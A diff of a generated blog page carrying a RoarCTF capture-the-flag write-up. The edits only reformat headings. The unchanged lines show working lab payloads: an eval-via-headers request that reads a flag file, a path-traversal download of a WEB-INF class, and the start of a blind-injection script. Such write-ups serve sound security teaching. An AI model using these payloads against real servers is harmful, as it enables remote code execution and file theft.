@@ -5,13 +5,12 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="roarctf writeup, hhblog">
-    <meta name="description" content="##Easy_calc(url解析)
-&amp;lt;?php
+    <meta name="description" content="Easy_calc(url解析)&amp;lt;?php
 error_reporting(0);
 if(!isset($_GET[&#39;num&#39;])){
     show_source(__FILE__);
 }else{
-        $str">
+        $str = ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -425,8 +424,7 @@ if(!isset($_GET[&#39;num&#39;])){
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>##Easy_calc(url解析)</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+                <h2 id="Easy-calc-url解析"><a href="#Easy-calc-url解析" class="headerlink" title="Easy_calc(url解析)"></a>Easy_calc(url解析)</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -477,8 +475,7 @@ if(!isset($_GET[&#39;num&#39;])){
 <pre class=" language-http"><code class="language-http">GET /calc.php?%20num=eval(end(getallheaders())) HTTP/1.1
 <span class="token header-name keyword">Host:</span> node3.buuoj.cn:28036
 <span class="token header-name keyword">flag:</span> var_dump(file_get_contents('/f1agg'));</code></pre>
-<p>##Easyjava(Java文件结构)</p>
-<p>登陆页面看到接口GET /Download?filename=help.docx</p>
+<h2 id="Easyjava-Java文件结构"><a href="#Easyjava-Java文件结构" class="headerlink" title="Easyjava(Java文件结构)"></a>Easyjava(Java文件结构)</h2><p>登陆页面看到接口GET /Download?filename=help.docx</p>
 <p><img src="/pic/LduWtSfIh8bDA7Z.png" alt="LduWtSfIh8bDA7Z"></p>
 <p>开始尝试</p>
 <pre class=" language-php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>Download<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>images<span class="token operator">/</span>img1<span class="token punctuation">.</span>jpg <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span></code></pre>
@@ -527,8 +524,7 @@ if(!isset($_GET[&#39;num&#39;])){
 <pre><code>POST /Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class HTTP/1.1</code></pre><pre><code>flagLjava/lang/String;&lt;init&gt;()VCodeLineNumberTabledoGetR(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V
 Exceptions#$
 SourceFileFlagController.javaRuntimeVisibleAnnotations%Ljavax/servlet/annotation/WebServlet;nameFlagController&lt;ZmxhZ3s5YjY3N2UwNC03MzM1LTQyNWEtYTMxZi1iOTVmZTc1MWFlNmR9Cg==    
-%&amp;&#39;&amp;&lt;h1&gt;Flag is nearby ~ Come on! !</code></pre><p>##Online_proxy(时间盲注)</p>
-<p>脚本</p>
+%&amp;&#39;&amp;&lt;h1&gt;Flag is nearby ~ Come on! !</code></pre><h2 id="Online-proxy-时间盲注"><a href="#Online-proxy-时间盲注" class="headerlink" title="Online_proxy(时间盲注)"></a>Online_proxy(时间盲注)</h2><p>脚本</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">import</span> string
 <span class="token keyword">import</span> random
